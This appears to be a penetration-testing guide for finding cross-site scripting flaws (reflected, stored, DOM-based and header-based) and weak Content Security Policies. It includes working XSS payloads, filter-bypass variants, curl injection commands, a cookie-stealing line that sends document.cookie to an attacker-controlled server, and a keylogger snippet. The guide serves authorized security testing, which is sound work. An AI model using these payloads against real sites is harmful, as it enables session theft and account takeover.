# Cross-Site Scripting (XSS) Testing

## Objective

Identify injection points where attacker-controlled data is rendered in the browser without proper encoding, enabling JavaScript execution in the context of the victim's browser.

---

## 1. Reflected XSS

### Test Approach
Inject a benign, unique marker into every input reflected in the response. Escalate to script injection only if the marker appears unencoded.

### Step 1 — Identify Reflection Points
```bash
# Inject a unique string and check if it reflects unencoded
MARKER="xsstest1337"

curl -si "https://target/search?q=$MARKER" | grep -o "$MARKER"
curl -si "https://target/page?error=$MARKER" | grep -o "$MARKER"
```

### Step 2 — Determine Encoding Context
Look at *where* the value appears in the HTML:
- **HTML body context**: `<p>MARKER</p>` → use `<img src=x onerror=alert(1)>`
- **HTML attribute context**: `<input value="MARKER">` → use `"><img src=x onerror=alert(1)>`
- **JavaScript context**: `var x = "MARKER"` → use `";alert(1)//`
- **URL context**: `<a href="MARKER">` → use `javascript:alert(1)`

### Safe PoC Payload (Non-Destructive)
```
<script>alert(document.domain)</script>
"><script>alert(document.domain)</script>
'><script>alert(document.domain)</script>
<img src=x onerror=alert(document.domain)>
"><img src=x onerror=alert(document.domain)>
javascript:alert(document.domain)
```

### WAF Bypass Patterns (if applicable)
```
<ScRiPt>alert(1)</ScRiPt>
<img/src=x onerror=alert(1)>
<svg onload=alert(1)>
<body onload=alert(1)>
<details open ontoggle=alert(1)>
```

---

## 2. Stored XSS

### Test Procedure
1. Identify all input fields that store data and display it back to users:
   - Profile name/bio
   - Comments / reviews
   - Message / notification text
   - Support ticket body
   - User-supplied URLs (avatar URL, website field)

2. Inject safe PoC payload into each field
3. Verify the payload is stored and rendered when viewed

### Profile/Comment Injection
```bash
# Submit stored XSS via API
curl -si -X PUT https://target/api/profile \
  -H "Authorization: Bearer USER_TOKEN" \
  -H "Content-Type: application/json" \
  -d '{"bio":"<img src=x onerror=alert(document.domain)>"}' \
  | grep HTTP

# Visit profile page and observe if payload fires
curl -si https://target/users/ATTACKER_PROFILE \
  -H "Cookie: session=VICTIM_SESSION" \
  | grep -i "onerror\|alert"
```

### Admin-Visible Stored XSS
Check if admin panels render user-supplied data:
- Username in admin user list
- IP address in audit logs
- User-Agent in admin logs
- Support ticket subject/body rendered in admin UI

---

## 3. DOM-Based XSS

### Identify Dangerous Sinks in JavaScript
```bash
# Download all JS files
curl -s https://target/static/app.js | grep -E \
  "innerHTML|outerHTML|document\.write|eval\(|setTimeout\(|location\.href|location\.hash"
```

### Common DOM XSS Sources
```javascript
// URL hash
location.hash
location.search
document.URL

// localStorage / sessionStorage
localStorage.getItem()
sessionStorage.getItem()
```

### Common DOM XSS Sinks
```javascript
innerHTML = userInput       // HIGH RISK
document.write(userInput)   // HIGH RISK
eval(userInput)             // CRITICAL
location.href = userInput   // CRITICAL
```

### Test URL Fragment Injection
```
https://target/page#<img src=x onerror=alert(document.domain)>
https://target/page?redirect=javascript:alert(document.domain)
```

---

## 4. Header-Based XSS

Test injection via HTTP request headers that may be reflected in responses:

```bash
# X-Forwarded-For injection
curl -si https://target/ \
  -H 'X-Forwarded-For: <script>alert(1)</script>' \
  | grep -i "script\|x-forwarded"

# User-Agent injection
curl -si https://target/ \
  -H 'User-Agent: <img src=x onerror=alert(1)>' \
  | grep -i "user-agent\|onerror"

# Referer injection
curl -si https://target/page \
  -H 'Referer: <script>alert(1)</script>' \
  | grep -i "referer\|script"
```

---

## 5. XSS in JSON/API Responses

If the application returns data in JSON that is rendered in the DOM:
```bash
# Test if API response data is sanitized before rendering
curl -si -X POST https://target/api/comments \
  -H "Content-Type: application/json" \
  -d '{"comment":"<script>alert(1)</script>"}' | grep HTTP

# Check how the comment appears when rendered
curl -s https://target/api/comments | grep -i "script\|alert"
```

---

## 6. XSS Impact Escalation (PoC Only)

Safe payloads to demonstrate impact without destructive action:

**Session cookie theft (PoC — use only on your own test account):**
```javascript
// Only for demonstrating impact in report — DO NOT run against other users
fetch('https://attacker-controlled-server/steal?c='+document.cookie)
```

**Keylogger demonstration:**
```javascript
document.onkeypress = function(e) {
  fetch('/log?k='+e.key)
}
```

> **Rule**: Do not exfiltrate any real user session tokens. Demonstrate impact on your own test account only.

---

## Content Security Policy (CSP) Analysis

```bash
# Check CSP header
curl -si https://target/ | grep -i "content-security-policy"

# Common CSP weaknesses to note:
# - unsafe-inline present → CSP bypassable
# - unsafe-eval present → CSP bypassable
# - Wildcard * in script-src → CSP bypassable
# - JSONP endpoints on allowed CDN hosts
```

---

## Evidence to Capture

- Input field/URL parameter where payload was injected
- The reflected/stored output in page source (unencoded)
- Browser screenshot showing alert popup with `document.domain`
- Full HTTP request and response

---

## Findings Reference

| Test | Result | Severity |
|---|---|---|
| Reflected XSS (no auth) | Pass/Fail | High |
| Reflected XSS (authenticated) | Pass/Fail | Medium-High |
| Stored XSS (user-visible) | Pass/Fail | High |
| Stored XSS (admin-visible) | Pass/Fail | Critical |
| DOM-based XSS | Pass/Fail | Medium-High |
| Header-based XSS | Pass/Fail | Medium |
| CSP missing/bypassable | Pass/Fail | Medium (modifier) |
